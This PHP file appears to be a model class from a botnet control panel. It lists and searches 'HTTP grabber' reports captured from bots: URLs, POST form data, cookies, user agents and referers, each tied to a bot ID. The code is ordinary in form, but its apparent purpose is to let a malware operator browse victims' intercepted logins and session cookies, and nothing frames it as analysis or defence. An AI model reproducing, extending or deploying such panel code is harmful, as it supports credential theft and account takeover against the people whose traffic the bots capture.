<?php

require_once 'application/models/accessory_models/PaginationWorker.php';

class Model_Http_Grabber extends Model
{

    public function get_data()
    {

    }

    public function getGrabberData()
    {
        if (empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $generalFilter = base64_decode($this->request_data['filter']);

        $filters = json_decode(base64_decode($this->request_data['additional_filters']), true);

        if (!empty($generalFilter))
        {
            $paginationWorker->setFilter(
                ' AND (url LIKE :filter OR
                    post_data LIKE :filter OR
                    bots.botid LIKE :filter OR
                    cookie LIKE :filter)
                ', array(':filter' => $generalFilter));
        } else
        {
            $paginationWorker->setAdditionalFilter($filters, false);
        }
        
        $grabberData = $this->getDB()->queryRows(
            'SELECT
                      reports_http_grabber.id,reports_http_grabber.bot_id,bots.botid as botid,url,post_data,insert_date
                    FROM
                      reports_http_grabber, bots WHERE (bots.id = reports_http_grabber.bot_id)'.$paginationWorker->getFilterText(). $paginationWorker->getOrderBy('reports_http_grabber.id', true) . $paginationWorker->getLimit(),
                    $paginationWorker->getFilterValues());

        $totalCount = $this->getDB()->queryValue(
            'SELECT
                      COUNT(reports_http_grabber.id)
                    FROM
                      reports_http_grabber, bots WHERE (bots.id = reports_http_grabber.bot_id)
                      '.$paginationWorker->getFilterText() . $paginationWorker->getOrderBy('reports_http_grabber.id', true),
                    $paginationWorker->getFilterValues());

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $grabberData, function($dataRow) {
            return '
                <div data-http-grabber-row-id="'.$dataRow['id'].'">
                    <span class="bot-forms-url">'.htmlspecialchars($this->cutString($dataRow['url'], 0, 100)).'</span>
                    <div class="alert alert-default bot-forms-post-data">
                        <div>'.htmlspecialchars($this->cutString($dataRow['post_data'], 0, 260)).'</div>
                        <a class="bot-forms-post-data-more" onclick="getFormsDataById('.$dataRow['id'].')" data-toggle="modal" data-target="#bot-tab-forms-show-more-info">Show more...</a>
                    </div>
                    <div class="bot-forms-date">
                        <span>BOT ID: <a href="/bot?bot_id='.$dataRow['bot_id'].'"><u>'.htmlspecialchars($dataRow['botid']).'</u></a></span>, <span>TIME: <u>'.htmlspecialchars($dataRow['insert_date']).'</u></span>
                    </div>
                </div>
            ';
        });

        return $responseData;
    }

    public function getFormsData()
    {
        if (empty($this->request_data['form_id']))
        {
            return NULL;
        }

        $formData = $this->getDB()->queryRow('SELECT * FROM reports_http_grabber WHERE id=:id', array(':id' => $this->request_data['form_id']));

        if (empty($formData))
        {
            return NULL;
        }

        $formDataHtml = '';

        $formDataHtml .= '
            <h4>URL</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['url']).'</span>
            <br>
            <hr>
            <h4>User Agent</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['useragent']).'</span>
            <br>
            <hr>
            <h4>Content Type</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['content_type']).'</span>
            <br>
            <hr>
            <h4>Accept Encoding</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['accept_encoding']).'</span>
            <br>
            <hr>
            <h4>Accept Language</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['accept_language']).'</span>
            <br>
            <hr>
            <h4>Referer</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['referer']).'</span>
            <br>
            <hr>
            <h4>Cookie</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['cookie']).'</span>
            <br>
            <hr>
            <h4>Post Data</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['post_data']).'</span>
            <br>
            <hr>
            <h4>Flags</h4>
            '.htmlspecialchars($formData['flags']).'
            <br>
            <hr>
            <h4>Date</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['insert_date']).'</span>
            <br>
        ';

        return $formDataHtml;
    }

    private function cutString($string, $start = 0, $width = 120, $trim_marker = '...')
    {
        $len = strlen(trim($string));
        $new_string = (($len > $width) && ($len !== 0)) ? rtrim(mb_strimwidth($string, $start, $width - strlen($trim_marker))) . $trim_marker : $string;
        return $new_string;
    }
}